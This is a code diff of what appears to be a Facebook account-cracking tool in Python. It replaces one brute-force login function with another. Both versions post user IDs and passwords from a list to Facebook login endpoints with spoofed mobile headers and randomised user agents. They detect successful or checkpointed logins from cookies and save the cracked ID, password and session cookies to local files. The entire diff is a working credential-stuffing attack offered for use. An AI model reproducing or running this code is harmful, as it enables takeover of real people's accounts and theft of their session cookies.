@@ -1394,46 +1394,75 @@ def rndm4(uid,passlist):
 
 
 def rndm5(uid,passlist):
-        global loop
-        global oks
-        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M5{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        url = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr"
-                        au=Ugen()
-                        with requests.Session() as ses:
-                           ses.headers.update({'Host': 'mbasic.facebook.com','Connection': 'keep-alive','Cache-Control': 'max-age=0','dpr': '2.8375000953674316','viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','Upgrade-Insecure-Requests': '1','User-Agent': ___ua___,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','dnt': '1','X-Requested-With': 'com.facebook.katana','Sec-Fetch-Site': 'none','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Referer': 'https://m.facebook.com/','Accept-Language': 'en-GB,en;q=0.9,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',})
-                           link = ses.get(url)
-                           koki =  (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
-                           koki+= "m_pixel_ratio=2.8375000953674316; ps_n=0; ps_l=0;locale=bn_IN; wl_cbv=v2%3Bclient_version%3A2448%3Btimestamp%3A1711417561; vpd=v1%3B461x381x2.8375000953674316; wd=381x712;"
-                           data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'pass':pas, 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
-                           headers={'Host': 'mbasic.facebook.com','Connection': 'keep-alive','Content-Length': str(len(data)),'Cache-Control': 'max-age=0','dpr': '2.8375000953674316','viewport-width': '980','sec-ch-ua': 'Chromium;v=118, Android','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','Upgrade-Insecure-Requests': '1','Origin': 'https://mbasic.facebook.com','Content-Type': 'application/x-www-form-urlencoded','User-Agent': au,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','X-Requested-With': 'com.facebook.katana','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&display=touch&locale=en_BD&pl_dbl=0&refsrc=deprecated&_rdr','Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',}
-                        po = ses.post(f'https://mbasic.facebook.com/login/device-based/regular/login/?api_key=490105264797912&auth_token=c1f860ebff6dcbf204cf9afed7a79328&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1711420643313%26e2e%3D%257B%2522init%2522%253A1711420643313%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D8fa34b76-b252-467f-beed-dc94dff380b0%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DllDIZMzXbsBgkkSCWNk9dzQAmzpFXTs99hU-_i7-3-Y%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf353f3-6c70-4364-a024-fe67f77d813c%26tp%3Dunspecified&refsrc=deprecated&app_id=490105264797912&cancel=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bdf353f3-6c70-4364-a024-fe67f77d813c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522or7mb8lkniv57ospkhna%2522%257D&lwv=100&locale2=en_BD&refid=9',headers=headers,data=data,cookies={'cookie': koki},allow_redirects=False)
-                        log_cookies=session.cookies.get_dict().keys()
-                        if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                                        coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
-                                        cid = re.findall('c_user=(.*);xs', coki)[0]
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
-                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M5-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(cid)
-                                        cek_apk(session, coki)
-                                        return True
-                        elif 'checkpoint' in log_cookies:
-                                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                                        coki1 = coki.split("1000")[1]
-                                        uid = "1000"+coki1[0:11]
-                                        print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
-                                        cps.append(uid)
-                                        return True
-                               
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-
+	global loop
+	global cps
+	global oks
+	sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+	session=requests.Session()
+	try:
+		for pasw in passlist:
+			ses = requests.Session()
+			heas = {"Host": "x.facebook.com",
+				"dnt": "1","upgrade-insecure-requests": "1",
+				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"sec-fetch-site": "none",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-user": "?1",
+				"sec-fetch-dest": "document",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
+			link = ses.get("https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
+			gett = sop(link.text, "html.parser")
+			datax = gett.find("form",{"method":"post"})["action"]
+			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+				"try_number": "0",
+				"unrecognized_tries": "0",
+				"email": uid,
+				"pass": pasw,
+				"login": "Masuk",
+				"bi_xrwh": "0"}
+			cookie = dict(ses.cookies.get_dict())
+			head = {"Host": " x.facebook.com",
+				"content-length": "160",
+				"cache-control": "max-age=0",
+				"origin": "https://mbasic.facebook.com",
+				"upgrade-insecure-requests": "1",
+				"dnt": "1",
+				"content-type": "application/x-www-form-urlencoded",
+				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-user": "?1",
+				"sec-fetch-dest": "document",
+				"referer": "https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			xnxx = ses.post(f"https:// x.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
+			fb_cookies=ses.cookies.get_dict().keys()
+			if 'c_user' in fb_cookies:
+				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+				uidx = coki[65:80]
+				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pasw+'|'+coki+'\033[0;97m')
+				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
+				oks.append(uidx)
+				break
+			elif 'checkpoint' in fb_cookies:
+				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+				uidx = coki[82:97]
+				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pasw+'\033[0;97m')
+				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
+				cps.append(uidx)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
 #----------------[ ID-CHECKER ]--------------------------#
 
 def cek_apk(session, coki):
